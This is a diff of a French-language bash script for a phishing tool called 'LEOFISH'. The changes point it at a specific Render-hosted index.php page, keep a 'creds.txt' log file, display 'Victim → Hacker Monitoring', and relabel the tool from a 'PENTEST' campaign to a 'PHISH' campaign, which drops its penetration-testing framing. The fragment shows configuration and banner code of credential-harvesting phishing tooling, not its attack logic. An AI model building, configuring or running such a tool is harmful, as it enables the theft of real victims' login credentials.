@@ -20,7 +20,7 @@ HELP_FILE="help.text"
 LOGS_FILE="creds.txt"
 
 # URL de ton app Render (modifie ici)
-APP_URL="https://ton-app.onrender.com"
+APP_URL="https://leofish-tool-v1-0.onrender.com/index.php"
 
 # Créer dossier sessions
 mkdir -p sessions
@@ -36,7 +36,7 @@ show_banner() {
     fi
     echo -e "${NC}"
     echo -e "${WHITE}╔══════════════════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${WHITE}║${YELLOW}                    LEOFISH PENTEST TERMINAL v1.0                    ${WHITE}║${NC}"
+    echo -e "${WHITE}║${YELLOW}                    LEOFISH TERMINAL v1.0                    ${WHITE}║${NC}"
     echo -e "${WHITE}║${GREEN}                    Victim → Hacker Monitoring                        ${WHITE}║${NC}"
     echo -e "${WHITE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
     echo ""
@@ -47,7 +47,7 @@ show_banner() {
 # ══════════════════════════════════════════
 generate_campaign() {
     show_banner
-    echo -e "${PURPLE}🎯 NOUVELLE CAMPAGNE PENTEST${NC}"
+    echo -e "${PURPLE}🎯 NOUVELLE CAMPAGNE DE PHISH ${NC}"
     echo ""
 
     # Lancer le serveur Render (ping pour le réveiller)
